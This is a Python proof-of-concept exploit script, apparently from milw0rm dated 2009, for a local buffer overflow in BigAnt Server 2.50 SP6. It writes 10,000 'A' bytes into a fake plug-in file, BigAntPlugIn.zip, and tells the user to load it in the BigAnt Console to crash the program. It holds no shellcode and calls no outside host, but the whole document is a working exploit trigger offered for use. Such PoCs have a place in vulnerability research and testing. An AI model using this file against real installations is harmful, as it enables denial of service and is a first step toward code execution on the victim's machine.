#!/usr/bin/env python

########################################################################
#
# BigAnt Server <= 2.50 SP6 Local (ZIP File) Buffer Overflow PoC #2
# Found By: 	Dr_IDE
# Tested:   	XPSP3
# Usage:		Open BigAnt Console, Go to Plug-In, Add our zip, Boom.
#
########################################################################

buff = ("\x41" * 10000)

f1 = open("BigAntPlugIn.zip","w")
f1.write(buff)
f1.close()

# milw0rm.com [2009-09-21]